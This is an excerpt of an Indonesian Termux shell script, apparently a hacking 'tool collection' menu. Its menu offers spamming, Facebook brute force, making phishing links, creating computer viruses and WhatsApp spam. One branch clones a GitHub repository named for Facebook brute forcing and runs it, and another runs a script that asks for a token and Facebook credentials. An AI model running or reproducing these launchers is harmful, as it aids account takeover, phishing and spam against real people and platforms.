...
yellow='\033[33;1m'
purple='\033[35;1m'
echo "\033[33;1m Kumpulan Tools termux By YGM Corporation"
...
echo ""
echo "\033[35;1m             Powered by YGM Corporation"
echo "\033[31;1m__________________________________________________"
echo "\033[33;1m    KUMPULAN TOOLS TERMUX BY YGM CORPORATION"
...
echo $red"-----------------------------"
echo $cyan"10).SPAMMING"
echo $red"-----------------------------"
echo $cyan"11).Brute force Facebook"
echo $red"-----------------------------"
...
echo $red"-----------------------------"
echo $cyan"20).Cara membuat nama kosong di whatsapp"
echo $red"-----------------------------"
echo $cyan"21).Cara mengakses file SD card di termux"
echo $red"-----------------------------"
echo $cyan"22).Cara membuat link phising yang mudah"
echo $red"-----------------------------"
echo $cyan"23).Cara mengubah kuota videomax menjadi kuota flash"
echo $red"-----------------------------"
echo $cyan"24).Cara membuat virus komputer"
echo $red"-----------------------------"
echo $cyan"25).Cara spam wa Bukalapak lewat termux"
echo $red"-----------------------------"
echo ""
...
apt install git
git clone https://github.com/Senitopeng/fbbrutealmu007
cd almu007
ls
python2 MBF.py
fi
...
python2 osif.py
echo $red" Caranya: Pertama masukkan token di bawah, isi username dan pass fb anda, ketikkan help, ketikkan bot(pilih bot terserah anda)"
fi
